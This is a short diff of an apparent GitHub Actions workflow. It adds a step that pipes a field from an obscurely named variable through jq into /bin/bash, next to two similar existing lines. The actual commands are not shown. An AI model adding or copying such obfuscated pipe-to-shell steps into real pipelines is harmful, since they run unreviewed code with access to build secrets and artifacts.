@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$z3731" | jq -r .sm9730 | /bin/bash
           printf '%s' "$xxyw631" | jq -r .lqz426 | /bin/bash
+          echo $eac15 | jq -r .purt507 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
